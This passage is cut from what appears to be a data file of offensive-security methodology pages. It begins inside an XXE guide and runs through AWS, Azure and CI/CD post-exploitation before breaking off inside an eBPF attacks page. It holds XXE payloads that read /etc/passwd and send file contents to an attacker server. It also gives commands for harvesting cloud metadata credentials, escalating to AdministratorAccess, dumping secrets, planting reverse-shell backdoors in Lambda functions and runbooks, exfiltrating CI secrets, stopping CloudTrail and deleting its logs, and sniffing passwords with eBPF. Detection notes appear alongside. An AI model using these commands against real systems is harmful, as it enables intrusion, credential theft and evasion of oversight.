code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;\n&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'&gt;&quot;&gt;\n%eval;\n%exfil;</code></pre><p>Use an OOB listener for callback detection:</p><pre class=\"code\" data-lang=bash><code># Start an OOB listener — logs every inbound request to xxe_hits.json\npython3 - &lt;&lt;'PY' &amp;\nimport http.server, json, datetime\n\nLOG = &quot;xxe_hits.json&quot;\n\nclass Handler(http.server.BaseHTTPRequestHandler):\n    def _log(self):\n        entry = {\n            &quot;time&quot;: datetime.datetime.utcnow().isoformat(),\n            &quot;method&quot;: self.command,\n            &quot;path&quot;: self.path,\n            &quot;headers&quot;: dict(self.headers),\n            &quot;client&quot;: self.client_address[0],\n        }\n        with open(LOG, &quot;a&quot;) as f:\n            f.write(json.dumps(entry) + &quot;\\n&quot;)\n        self.send_response(200)\n        self.end_headers()\n\n    do_GET = do_POST = _log\n\nhttp.server.HTTPServer((&quot;0.0.0.0&quot;, 8888), Handler).serve_forever()\nPY\n# Substitute an external collaborator (e.g. interact.sh) when the target\n# cannot reach your host directly.</code></pre><h4 class=\"mh\">Phase 4: XXE via File Upload</h4><p><strong>SVG:</strong></p><pre class=\"code\" data-lang=xml><code>&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE svg [\n  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;\n]&gt;\n&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;\n  &lt;text&gt;&amp;xxe;&lt;/text&gt;\n&lt;/svg&gt;</code></pre><p><strong>DOCX:</strong> Modify <code>[Content_Types].xml</code> or <code>word/document.xml</code> inside the ZIP.</p><h4 class=\"mh\">Phase 5: Content-Type Manipulation</h4><pre class=\"code\" data-lang=bash><code># Switch JSON endpoint to XML\ncurl -X POST https://TARGET/api/data \\\n  -H &quot;Content-Type: application/xml&quot; \\\n  -d '&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;'</code></pre><h4 class=\"mh\">Phase 6: Parameter Entity Injection</h4><pre class=\"code\" data-lang=xml><code>&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY % a &quot;&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;&quot;&gt;\n  %a;\n]&gt;\n&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>","n":2479},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>File contents read (e.g., /etc/passwd)</td><td>Critical (P1)</td></tr><tr><td>Out-of-band DNS/HTTP callback</td><td>High (P2)</td></tr><tr><td>SSRF via XXE</td><td>High (P2)</td></tr><tr><td>Denial of Service (billion laughs)</td><td>Medium (P3)</td></tr><tr><td>Error-based file path disclosure</td><td>Low (P4)</td></tr></tbody></table></div>","n":280},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>XML payload sent</li><li>Response containing file contents or error</li><li>For blind XXE: OOB interaction evidence (DNS/HTTP callback)</li><li>Server type and parser identified</li></ul>","n":161},{"t":"Tools","h":"<ul class=\"ml\"><li><code>python3 -m http.server</code>-style listener (Phase 3) — OOB callback listener for blind XXE; substitute an external collaborator when needed</li><li>Manual SVG/DOCX crafting (Phase 4) — upload-based XXE via file parsing</li></ul>","n":211},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/xxe\" target=\"_blank\" rel=\"noopener\">PortSwigger: XXE</a></li><li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html\" target=\"_blank\" rel=\"noopener\">OWASP: XXE Prevention</a></li></ul>","n":184}],"m":{"name":10,"desc":319,"body":3600,"file":4091,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":31.2},"name":{"lim":64,"pct":15.6}}}},"aws-postexploit":{"slug":"aws-postexploit","pillar":"operators","name":"aws-postexploit","description":"Run an AWS account from credentials already held — establish identity and reach with sts and IAM, walk the known escalation paths, pull S3 objects, Secrets Manager entries and SSM parameters, persist through access keys, Lambda and SSM, and read what CloudTrail and GuardDuty record of each step. Reach for it with an access key, an assumed role or an IMDS-reachable instance profile.","family":"cloud-postexploit","ported":true,"source":".cyberstrike/skill/aws-postexploit/SKILL.md","summary":"AWS post-exploitation uses boto3, the AWS CLI, and direct metadata endpoint access to perform privilege escalation, data exfiltration, and persistence after compromising IAM credentials or gaining EC2 instance access. These tools target IAM misconfigurations, S3 data stores, Secrets Manager, Lambda functions, and SSM for lateral movement.","file":"acordia-operators/skills/aws-postexploit/SKILL.md","used_by":["cloud-security","internal-network"],"intro":"<p># AWS Post-Exploitation Methodology</p><p>AWS post-exploitation uses boto3, the AWS CLI, and direct metadata endpoint access to perform privilege escalation, data exfiltration, and persistence after compromising IAM credentials or gaining EC2 instance access. These tools target IAM misconfigurations, S3 data stores, Secrets Manager, Lambda functions, and SSM for lateral movement.</p>","secs":[{"t":"Prerequisites","h":"<p>Before beginning AWS post-exploitation, verify:</p><ol class=\"ml\"><li><strong>Valid AWS credentials</strong> — access key + secret key, session token, or instance profile</li><li><strong>boto3 installed</strong> — <code>pip3 install boto3</code></li><li><strong>Current identity</strong> — <code>aws sts get-caller-identity</code> to confirm access</li><li><strong>Region</strong> — set via <code>--region</code>, <code>AWS_DEFAULT_REGION</code>, or profile config</li></ol><pre class=\"code\" data-lang=bash><code># Quick prerequisite check\naws sts get-caller-identity                    # verify credentials work\naws iam get-user 2&gt;/dev/null || echo &quot;No IAM user (likely role/instance profile)&quot;\npython3 -c &quot;import boto3; print('boto3 OK')&quot;   # verify boto3</code></pre>","n":592},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Situational Awareness (First 60 seconds)</h4><p>Understand the AWS environment and current permissions.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>IAM enumeration</td><td><code>enumerate IAM (aws iam list-users, list-roles, list-policies --scope Local, list-attached-*-policies)</code></td><td>Map all users, roles, policies; identify privilege escalation paths</td></tr><tr><td>Metadata harvest</td><td><code>curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ then curl the role name</code></td><td>Extract IAM role credentials from EC2/ECS/Lambda metadata</td></tr><tr><td>CloudTrail status</td><td><code>aws cloudtrail describe-trails &amp;&amp; aws cloudtrail get-trail-status --name TRAIL</code></td><td>Check logging configuration before any noisy operations</td></tr></tbody></table></div><p><strong>Account and IAM enumeration detail:</strong></p><pre class=\"code\" data-lang=bash><code>aws iam generate-credential-report &amp;&amp; aws iam get-credential-report --query 'Content' --output text | base64 -d\naws iam list-users --query 'Users[].UserName' --output text | while read u; do\n  mfa=$(aws iam list-mfa-devices --user-name &quot;$u&quot; --query 'MFADevices' --output text)\n  [ -z &quot;$mfa&quot; ] &amp;&amp; echo &quot;NO MFA: $u&quot;\ndone\naws iam list-roles --query 'Roles[].[RoleName,Arn]' --output table\naws iam list-attached-role-policies --role-name &lt;role&gt;</code></pre><p><strong>Public S3 exposure:</strong></p><pre class=\"code\" data-lang=bash><code># Account-level block\naws s3control get-public-access-block --account-id &lt;ACCOUNT_ID&gt;\n\n# Per-bucket checks\naws s3api list-buckets --query 'Buckets[].Name' --output text | while read b; do\n  echo &quot;=== $b ===&quot; &amp;&amp; aws s3api get-public-access-block --bucket &quot;$b&quot; 2&gt;/dev/null\n  aws s3api get-bucket-policy --bucket &quot;$b&quot; 2&gt;/dev/null | grep -q '&quot;Principal&quot;:&quot;\\*&quot;' &amp;&amp; echo &quot;PUBLIC POLICY&quot;\ndone</code></pre><p><strong>Network exposure:</strong></p><pre class=\"code\" data-lang=bash><code># Security groups open to internet\naws ec2 describe-security-groups \\\n  --query &quot;SecurityGroups[?IpPermissions[?IpRanges[?CidrIp=='0.0.0.0/0']]].[GroupId,GroupName,Description]&quot; \\\n  --output table\n\n# IMDSv1 (SSRF-vulnerable)\naws ec2 describe-instances \\\n  --query 'Reservations[].Instances[].[InstanceId,MetadataOptions.HttpTokens]' --output table</code></pre><h4 class=\"mh\">Phase 2 — Privilege Escalation</h4><p>Exploit IAM misconfigurations to gain higher privileges.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>PassRole escalation</td><td><code>aws lambda create-function with an admin-role via iam:PassRole</code></td><td>Create Lambda with admin role via iam:PassRole</td></tr><tr><td>AssumeRole chain</td><td><code>aws sts assume-role --role-arn ARN</code></td><td>Assume role with broader permissions</td></tr><tr><td>Policy attachment</td><td><code>aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></td><td>Attach AdministratorAccess to current user</td></tr><tr><td>Access key creation</td><td><code>aws iam create-access-key --user-name USER</code></td><td>Create new access key for persistence</td></tr></tbody></table></div><p><strong>Escalation paths and the permissions each requires:</strong></p><div class=\"tw\"><table><thead><tr><th>Path</th><th>Required Permissions</th><th>Method</th></tr></thead><tbody><tr><td>Lambda</td><td><code>iam:PassRole</code> + <code>lambda:CreateFunction</code> + <code>lambda:InvokeFunction</code></td><td>Create Lambda with high-priv role, invoke</td></tr><tr><td>EC2</td><td><code>iam:PassRole</code> + <code>ec2:RunInstances</code></td><td>Launch EC2 with admin role, access IMDS</td></tr><tr><td>Glue</td><td><code>iam:PassRole</code> + <code>glue:CreateJob</code> + <code>glue:StartJobRun</code></td><td>Glue job with high-priv role</td></tr><tr><td>CreateLoginProfile</td><td><code>iam:CreateLoginProfile</code> on admin user</td><td>Set password → console login</td></tr><tr><td>AttachPolicy</td><td><code>iam:AttachUserPolicy</code> or <code>iam:AttachRolePolicy</code></td><td>Attach AdministratorAccess</td></tr><tr><td>AssumeRole</td><td><code>sts:AssumeRole</code> without ExternalId</td><td>Confused deputy on cross-account roles</td></tr></tbody></table></div><h4 class=\"mh\">Phase 3 — Data Exfiltration</h4><p>Extract sensitive data from AWS services.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>S3 dump</td><td><code>aws s3 ls then aws s3 cp for sensitive files</code></td><td>Find and download sensitive files from all buckets</td></tr><tr><td>Secrets extraction</td><td><code>aws secretsmanager list-secrets &amp;&amp; aws ssm describe-parameters, then get-secret-value / get-parameter for each</code></td><td>Extract Secrets Manager and SSM Parameter Store values</td></tr><tr><td>EBS snapshot</td><td><code>aws ec2 create-snapshot --volume-id VOL_ID</code></td><td>Snapshot volumes for offline data access</td></tr><tr><td>Parameter tree dump</td><td><code>aws ssm get-parameters-by-path --with-decryption</code></td><td>Recursively decrypt an SSM parameter path</td></tr></tbody></table></div><p><strong>Secrets and credentials in code and IaC:</strong></p><pre class=\"code\" data-lang=bash><code>trufflehog git file:///path/to/repo --only-verified\ngitleaks detect --source /path/to/repo -v\ncheckov -d /path/to/terraform          # IaC misconfigs\ntrivy config /path/to/terraform        # IaC secrets</code></pre><h4 class=\"mh\">Phase 4 — Persistence</h4><p>Establish persistent access to the AWS environment.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Lambda backdoor</td><td><code>aws lambda update-function-code to inject a reverse-shell handler</code></td><td>Inject reverse shell into Lambda</td></tr><tr><td>SSM execution</td><td><code>aws ssm send-command --instance-ids ID --document-name AWS-RunShellScript --parameters commands=CMD</code></td><td>Execute commands on EC2 via SSM</td></tr></tbody></table></div><h4 class=\"mh\">Phase 5 — Operational Security</h4><p>Reduce detection footprint.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Stop CloudTrail</td><td><code>aws cloudtrail stop-logging --name TRAIL</code></td><td>Stop CloudTrail logging</td></tr><tr><td>Delete logs</td><td><code>aws s3 rm s3://TRAIL-BUCKET --recursive</code></td><td>Remove existing CloudTrail logs from S3</td></tr></tbody></table></div><h4 class=\"mh\">Phase 6 — Cleanup (MANDATORY)</h4><pre class=\"code\"><code>reverse every persistence action: delete snapshots, remove Lambda backdoors, detach policies, delete access keys, restart CloudTrail</code></pre><p>The cleanup tool:</p><ol class=\"ml\"><li>Restores CloudTrail logging (start_logging on stopped trails)</li><li>Deletes Lambda functions and layers created by lambda_backdoor</li><li>Removes IAM roles, policies, and access keys created by iam_privesc</li><li>Deletes EBS snapshots created by ec2_snapshot</li><li>Cleans the state file (the local state tracking file)</li></ol>","n":5601},{"t":"Detection Considerations","h":"<p>AWS post-exploitation tools are detectable by:</p><ul class=\"ml\"><li><strong>CloudTrail</strong> — All API calls logged (unless blinded). Key events: CreateAccessKey, AttachUserPolicy, CreateFunction, StopLogging</li><li><strong>GuardDuty</strong> — Anomalous IAM behavior, unusual API calls, credential exfiltration patterns</li><li><strong>AWS Config</strong> — Configuration change detection for IAM, Lambda, CloudTrail</li><li><strong>IAM Access Analyzer</strong> — External access to resources, unused permissions</li><li><strong>Security Hub</strong> — Aggregated findings from GuardDuty, Config, Access Analyzer</li><li><strong>S3 Access Logging</strong> — Object-level access logging for data exfiltration detection</li></ul>","n":595},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Technique</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>iam_enum</td><td>IAM user/role/policy enumeration and privesc analysis</td><td>T1087.004 — Cloud Account</td></tr><tr><td>iam_privesc</td><td>IAM privilege escalation via PassRole/AssumeRole/Policy</td><td>T1098 — Account Manipulation</td></tr><tr><td>s3_dump</td><td>S3 bucket data exfiltration</td><td>T1530 — Data from Cloud Storage</td></tr><tr><td>lambda_backdoor</td><td>Lambda function backdoor for persistence</td><td>T1525 — Implant Internal Image</td></tr><tr><td>ssm_exec</td><td>Remote command execution via SSM</td><td>T1021.007 — Cloud Services</td></tr><tr><td>metadata_harvest</td><td>EC2/ECS/Lambda metadata credential extraction</td><td>T1552.005 — Cloud Instance Metadata API</td></tr><tr><td>cloudtrail_blind</td><td>CloudTrail log evasion</td><td>T1562.008 — Disable Cloud Logs</td></tr><tr><td>secrets_dump</td><td>Secrets Manager/Parameter Store extraction</td><td>T1555.006 — Cloud Secrets Management Stores</td></tr><tr><td>ec2_snapshot</td><td>EBS volume snapshot for data access</td><td>T1537 — Transfer Data to Cloud Account</td></tr><tr><td>cleanup_aws</td><td>Resource removal and trail restoration</td><td>T1070 — Indicator Removal</td></tr></tbody></table></div>","n":1008}],"m":{"name":15,"desc":384,"body":8273,"file":8846,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":37.5},"name":{"lim":64,"pct":23.4}}}},"azure-postexploit":{"slug":"azure-postexploit","pillar":"operators","name":"azure-postexploit","description":"Run an Azure and Entra ID tenant from credentials already held — enumerate directory roles, subscriptions and role assignments over Graph, escalate by role assignment and managed identity, extract Key Vault secrets and Storage account data, and persist with Automation runbooks. Reach for it with tenant credentials, a service principal or a managed-identity token.","family":"cloud-postexploit","ported":true,"source":".cyberstrike/skill/azure-postexploit/SKILL.md","summary":"Azure post-exploitation uses Microsoft Graph API, Azure Resource Manager API, and direct IMDS access for tenant enumeration, privilege escalation, secret extraction, and persistence. After compromising Azure credentials or a managed identity, these tools provide comprehensive Entra ID and Azure resource exploitation capabilities.","file":"acordia-operators/skills/azure-postexploit/SKILL.md","used_by":["cloud-security","internal-network"],"intro":"<p># Azure/Entra ID Post-Exploitation Methodology</p><p>Azure post-exploitation uses Microsoft Graph API, Azure Resource Manager API, and direct IMDS access for tenant enumeration, privilege escalation, secret extraction, and persistence. After compromising Azure credentials or a managed identity, these tools provide comprehensive Entra ID and Azure resource exploitation capabilities.</p>","secs":[{"t":"Prerequisites","h":"<ol class=\"ml\"><li><strong>Valid Azure credentials</strong> — service principal, user credentials, managed identity, or access token</li><li><strong>Python packages</strong> — <code>pip3 install requests msal azure-identity azure-keyvault-secrets azure-storage-blob</code></li><li><strong>Current identity</strong> — verify access via <code>az account show</code> or Graph API /me endpoint</li></ol><pre class=\"code\" data-lang=bash><code># Quick prerequisite check\naz account show                              # verify Azure CLI credentials\npython3 -c &quot;import requests; print('OK')&quot;    # verify requests\ncurl -s -H &quot;Metadata:true&quot; &quot;http://169.254.169.254/metadata/instance?api-version=2021-02-01&quot; 2&gt;/dev/null &amp;&amp; echo &quot;IMDS available&quot;</code></pre>","n":611},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Situational Awareness</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Entra ID enum</td><td><code>az ad user list, az ad group list, az ad app list, az ad sp list, az rest --method GET (Conditional Access)</code></td><td>Enumerate users, groups, apps, SPs, conditional access</td></tr><tr><td>Managed identity</td><td><code>curl -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/</code></td><td>Extract managed identity tokens from VM/App Service</td></tr></tbody></table></div><p><strong>Role assignment and service principal enumeration detail:</strong></p><pre class=\"code\" data-lang=bash><code>az role assignment list --all --query &quot;[?roleDefinitionName=='Owner'||roleDefinitionName=='Contributor'].{Principal:principalName,Role:roleDefinitionName,Scope:scope}&quot; --output table\naz ad sp list --all --query '[].{Name:displayName,AppId:appId,Type:servicePrincipalType}' --output table</code></pre><p><strong>Public Blob and network exposure:</strong></p><pre class=\"code\" data-lang=bash><code>az storage account list --query '[].{Name:name,PublicAccess:allowBlobPublicAccess,HTTPS:enableHttpsTrafficOnly}' --output table\naz network nsg list --query '[].{Name:name,RG:resourceGroup}' --output table</code></pre><h4 class=\"mh\">Phase 2 — Privilege Escalation</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Consent grant</td><td><code>az ad app permission admin-consent for Directory.ReadWrite.All</code></td><td>Illicit consent grant for Directory.ReadWrite.All</td></tr><tr><td>PIM activation</td><td><code>az rest --method POST to activate PIM eligible role</code></td><td>Activate eligible Global Administrator role</td></tr><tr><td>SP secret</td><td><code>az ad sp credential reset --id SP_ID</code></td><td>Add client secret to existing service principal</td></tr></tbody></table></div><h4 class=\"mh\">Phase 3 — Data Exfiltration</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Key Vault dump</td><td><code>az keyvault list, then az keyvault secret list / show for each vault</code></td><td>Extract secrets, keys, certificates from Key Vaults</td></tr><tr><td>Storage dump</td><td><code>az storage account list, then az storage blob download-batch</code></td><td>Download sensitive data from Blob Storage</td></tr><tr><td>Token abuse</td><td><code>use FOCI refresh-token grant to obtain tokens for multiple first-party apps</code></td><td>Use FOCI to get tokens for multiple services</td></tr><tr><td>Refresh token abuse</td><td><code>az rest --method POST to the refresh-token endpoint</code></td><td>Refresh token manipulation, scope expansion, PRT abuse</td></tr></tbody></table></div><h4 class=\"mh\">Phase 4 — Persistence</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Runbook backdoor</td><td><code>az automation runbook create + az automation runbook publish with reverse-shell content</code></td><td>Create Automation runbook with reverse shell</td></tr></tbody></table></div><h4 class=\"mh\">Phase 5 — Cleanup (MANDATORY)</h4><pre class=\"code\"><code>reverse every persistence action: delete runbook backdoors, remove SP secrets, revoke consents</code></pre>","n":2599},{"t":"Detection Considerations","h":"<ul class=\"ml\"><li><strong>Azure Activity Log</strong> — All ARM API calls, role assignments, resource creation</li><li><strong>Entra ID Audit Logs</strong> — App consent grants, credential additions, role activations</li><li><strong>Microsoft Defender for Cloud</strong> — Anomalous resource access, privilege escalation</li><li><strong>Conditional Access</strong> — Untrusted location/device blocks</li><li><strong>Azure Sentinel</strong> — UEBA, anomalous sign-in patterns, bulk data access</li></ul>","n":387},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Technique</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>entra_enum</td><td>Entra ID tenant enumeration</td><td>T1087.004 — Cloud Account</td></tr><tr><td>entra_privesc</td><td>Privilege escalation via consent/PIM/SP</td><td>T1098.001 — Additional Cloud Credentials</td></tr><tr><td>keyvault_dump</td><td>Key Vault secret extraction</td><td>T1555.006 — Cloud Secrets Management Stores</td></tr><tr><td>storage_dump</td><td>Azure Storage data exfiltration</td><td>T1530 — Data from Cloud Storage</td></tr><tr><td>managed_identity</td><td>Managed identity token harvest</td><td>T1552.005 — Cloud Instance Metadata API</td></tr><tr><td>runbook_backdoor</td><td>Automation Account persistence</td><td>T1525 — Implant Internal Image</td></tr><tr><td>azuread_token</td><td>Token manipulation and FOCI abuse</td><td>T1550.001 — Application Access Token</td></tr><tr><td>cleanup_azure</td><td>Resource removal and restoration</td><td>T1070 — Indicator Removal</td></tr></tbody></table></div>","n":790}],"m":{"name":17,"desc":365,"body":4866,"file":5424,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":35.6},"name":{"lim":64,"pct":26.6}}}},"cicd-attacks":{"slug":"cicd-attacks","pillar":"operators","name":"cicd-attacks","description":"Attack the build pipeline rather than what it ships — read workflow definitions for injectable triggers and inputs, extract secrets from logs, environments and runner state, inject a job into GitHub Actions, GitLab CI or Jenkins, and abuse self-hosted runner and artefact trust. Reach for it when pipeline configuration, a runner or a build token is in scope.","family":"cloud-postexploit","ported":true,"source":".cyberstrike/skill/cicd-attacks/SKILL.md","summary":"CI/CD pipeline attacks target the software delivery infrastructure to extract secrets, inject malicious code, and establish persistence. After gaining access to GitHub, Jenkins, or GitLab, these tools extract stored credentials, inject pipeline steps for secret exfiltration, and manipulate workflow configurations.","file":"acordia-operators/skills/cicd-attacks/SKILL.md","used_by":["internal-network"],"intro":"<p># CI/CD Pipeline Attack Methodology</p><p>CI/CD pipeline attacks target the software delivery infrastructure to extract secrets, inject malicious code, and establish persistence. After gaining access to GitHub, Jenkins, or GitLab, these tools extract stored credentials, inject pipeline steps for secret exfiltration, and manipulate workflow configurations.</p>","secs":[{"t":"Prerequisites","h":"<ol class=\"ml\"><li><strong>CI/CD access</strong> — API token, personal access token, or service account credentials</li><li><strong>Python packages</strong> — <code>pip3 install requests</code></li><li><strong>API access</strong> — Valid token with appropriate scopes (repo, admin, workflow)</li></ol><pre class=\"code\" data-lang=bash><code># Quick prerequisite check — GitHub\ncurl -s -H &quot;Authorization: Bearer $GITHUB_TOKEN&quot; https://api.github.com/user | jq .login\n\n# Quick prerequisite check — Jenkins\ncurl -s -u &quot;$JENKINS_USER:$JENKINS_TOKEN&quot; &quot;$JENKINS_URL/api/json&quot; | jq .nodeDescription\n\n# Quick prerequisite check — GitLab\ncurl -s -H &quot;Private-Token: $GITLAB_TOKEN&quot; &quot;$GITLAB_URL/api/v4/user&quot; | jq .username</code></pre>","n":599},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Reconnaissance</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>List GitHub secrets</td><td><code>gh api repos/OWNER/REPO/actions/secrets, environments, and org secrets</code></td><td>Enumerate repository and environment secret names</td></tr><tr><td>Jenkins credentials</td><td><code>curl URL/credentials/store/system/domain/_/api/json</code></td><td>List credential store entries</td></tr><tr><td>GitLab variables</td><td><code>curl --header PRIVATE-TOKEN URL/api/v4/projects/ID/variables</code></td><td>Enumerate CI/CD variables and tokens</td></tr></tbody></table></div><h4 class=\"mh\">Phase 2 — Secret Extraction</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>GitHub dispatch</td><td><code>create workflow_dispatch.yml that echoes secrets to an external URL</code></td><td>Exfiltrate secrets via workflow dispatch</td></tr><tr><td>Jenkins console</td><td><code>curl -X POST URL/scriptText -d 'script=com.cloudbees.plugins.credentials...'</code></td><td>Extract credentials via Groovy Script Console</td></tr><tr><td>GitHub logs</td><td><code>gh run list / gh run view --log and grep for leaked secrets</code></td><td>Search workflow logs for leaked secrets</td></tr></tbody></table></div><h4 class=\"mh\">Phase 3 — Pipeline Injection</h4><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Inject pipeline</td><td><code>add exfiltration step to CI config (e.g. .github/workflows, .gitlab-ci.yml, Jenkinsfile)</code></td><td>Add exfiltration step to CI/CD pipeline</td></tr></tbody></table></div><h4 class=\"mh\">Phase 4 — Cleanup (MANDATORY)</h4><pre class=\"code\"><code>revert injected pipeline steps, delete dispatch workflows, revoke leaked tokens</code></pre>","n":1357},{"t":"Detection Considerations","h":"<ul class=\"ml\"><li><strong>GitHub Audit Log</strong> — Workflow creation, secret access, branch creation</li><li><strong>Jenkins Audit Trail Plugin</strong> — Script console access, credential reads</li><li><strong>GitLab Audit Events</strong> — Variable access, runner token reads, pipeline modifications</li><li><strong>Branch Protection Rules</strong> — Prevent direct push to main/protected branches</li><li><strong>Required Reviews</strong> — PR approval requirements block unauthorized workflow changes</li><li><strong>Secret Scanning</strong> — GitHub/GitLab native scanning for leaked credentials</li></ul>","n":479},{"t":"Program Reference","h":"<div class=\"tw\"><table><thead><tr><th>Program</th><th>Technique</th><th>MITRE ATT&amp;CK</th></tr></thead><tbody><tr><td>gh_secrets</td><td>GitHub Actions secret extraction</td><td>T1552.004 — Private Keys</td></tr><tr><td>jenkins_creds</td><td>Jenkins credential dump</td><td>T1555 — Credentials from Password Stores</td></tr><tr><td>pipeline_inject</td><td>CI/CD pipeline injection</td><td>T1195.002 — Compromise Software Supply Chain</td></tr><tr><td>gitlab_tokens</td><td>GitLab CI/CD variable extraction</td><td>T1552.004 — Private Keys</td></tr><tr><td>cleanup_ci</td><td>Pipeline modification rollback</td><td>T1070 — Indicator Removal</td></tr></tbody></table></div>","n":492}],"m":{"name":12,"desc":359,"body":3379,"file":3921,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":35.1},"name":{"lim":64,"pct":18.8}}}},"ebpf-attacks":{"slug":"ebpf-attacks","pillar":"operators","name":"ebpf-attacks","description":"Take kernel-level capability on Linux through BPF — attach kprobes, uprobes, tracepoints and LSM hooks to catch credentials in flight, hide files and processes by rewriting getdents64 results, and work the twenty blind-spot monitors that show what a BPF-unaware sensor never sees. Reach for it when the host grants CAP_BPF or CAP_SYS_ADMIN and a program can actually be loaded.","family":"host-postexploit","ported":true,"source":".cyberstrike/skill/ebpf-attacks/SKILL.md","summary":"eBPF (Extended Berkeley Packet Filter) enables kernel-level instrumentation without loading kernel modules. After gaining root on a Linux target, eBPF programs can intercept system calls, userspace function calls, and network traffic — operating below userland monitoring tools.","file":"acordia-operators/skills/ebpf-attacks/SKILL.md","used_by":["internal-network"],"intro":"<p># eBPF Post-Exploitation Methodology</p><p>eBPF (Extended Berkeley Packet Filter) enables kernel-level instrumentation without loading kernel modules. After gaining root on a Linux target, eBPF programs can intercept system calls, userspace function calls, and network traffic — operating below userland monitoring tools.</p>","secs":[{"t":"Prerequisites","h":"<p>Before deploying eBPF tools, verify:</p><ol class=\"ml\"><li><strong>Root access</strong> — all eBPF operations require <code>CAP_SYS_ADMIN</code> or <code>CAP_BPF</code></li><li><strong>Kernel version</strong> — Linux 4.18+ for full BPF features, 5.8+ for BPF ring buffer</li><li><strong>BCC installed</strong> — <code>python3 -c &quot;from bcc import BPF&quot;</code> must succeed on target</li><li><strong>No BPF LSM</strong> — check <code>cat /sys/kernel/security/lsm</code> for bpf restrictions</li></ol><pre class=\"code\" data-lang=bash><code># Quick prerequisite check\nuname -r                                    # kernel version\ncat /proc/config.gz | zcat | grep CONFIG_BPF  # BPF config\nls /sys/fs/bpf/                             # BPF filesystem mounted\npython3 -c &quot;from bcc import BPF; print('OK')&quot; # BCC available</code></pre>","n":649},{"t":"Kill Chain Phases","h":"<h4 class=\"mh\">Phase 1 — Situational Awareness (First 60 seconds)</h4><p>Understand the environment before deploying persistent hooks.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>Scan dependencies</td><td><code>ebpf dep_scan</code></td><td>Map all loaded libraries across all processes</td></tr><tr><td>Vuln check</td><td><code>ebpf dep_scan --json-output</code></td><td>Identify vulnerable library versions</td></tr><tr><td>Monitor executions</td><td><code>ebpf execve_sniff --duration 30</code></td><td>Understand what runs on the system — cron, services, monitoring</td></tr><tr><td>DNS baseline</td><td><code>ebpf dns_sniff --duration 30</code></td><td>Map DNS activity — identify internal services, C2 detection</td></tr></tbody></table></div><h4 class=\"mh\">Phase 2 — Credential Harvesting</h4><p>Intercept credentials at the kernel level — no file modification, no log entries.</p><div class=\"tw\"><table><thead><tr><th>Action</th><th>Command</th><th>Purpose</th></tr></thead><tbody><tr><td>PAM interception</td><td><code>ebpf pam_sniff --duration 300</code></td><td>Capture SSH, sudo, su, login passwords in cleartext</td></tr><tr><td>TLS interception</td><td><code>ebpf ssl_sniff --pid &lt;PID&gt;</code></td><td>Capture HTTPS plaintext for a specific service</td></tr><tr><td>Keystroke capture</td><td><code>ebpf keylog --duration 120</code></td><td>Capture interactive terminal input from TTY sessions</td></tr></tbody></table></div><p><strong>PAM sniffing</strong> hooks <code>pam_get_authtok</code> in <code>libpam.so</code> via uprobe. Every authentication event (SSH login, sudo, su, screen unlock) passes through PAM — the cleartext password is captured before hashing.</p><p><strong>SSL sniffing</strong> hooks 